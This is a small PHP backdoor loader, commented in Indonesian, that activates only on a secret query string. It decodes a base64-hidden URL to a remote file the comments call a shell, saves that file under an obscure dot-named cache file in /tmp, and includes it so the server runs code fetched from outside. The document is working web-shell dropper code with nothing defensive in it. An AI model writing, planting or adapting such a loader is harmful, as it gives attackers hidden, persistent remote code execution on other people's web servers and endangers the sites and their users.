<?php
if ($_SERVER['QUERY_STRING'] === 'JandaPirangAbang') {

    // ✅ GANTI INI AJA BRO!
    // ---------------------
    $REMOTE_SHELL_URL = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzVZNEgvc2VvL21haW4vc2VvYmFyYmFyLnBocA==');
    $LOCAL_CACHE_DIR  = '/tmp';  // ganti ke path lain kalau mau, contoh: __DIR__ . '/.cache'
    // ---------------------

    // 🔐 Nama file acak tapi tetap (berbasis lokasi file & OS)
    $hash = md5(__FILE__ . php_uname());
    $filename = ".cache_{$hash}.php";
    $cache_file = rtrim($LOCAL_CACHE_DIR, '/\\') . DIRECTORY_SEPARATOR . $filename;

    // 🔁 Cek & download kalau belum ada
    if (!file_exists($cache_file)) {
        $s = @file_get_contents($REMOTE_SHELL_URL);

        if (!$s || stripos($s, '<html') !== false || strlen($s) < 10) {
            http_response_code(500);
            die("❌ Gagal ambil shell atau isi bukan PHP.");
        }

        // Simpan ke file lokal
        if (!@file_put_contents($cache_file, $s)) {
            http_response_code(500);
            die("❌ Gagal nulis ke cache: $cache_file");
        }
    }

    // 🚀 Jalankan shell
    try {
        include $cache_file;
    } catch (Throwable $e) {
        http_response_code(500);
        echo "❌ Error saat include shell: " . htmlspecialchars($e->getMessage());
    }

    exit;
}
?>
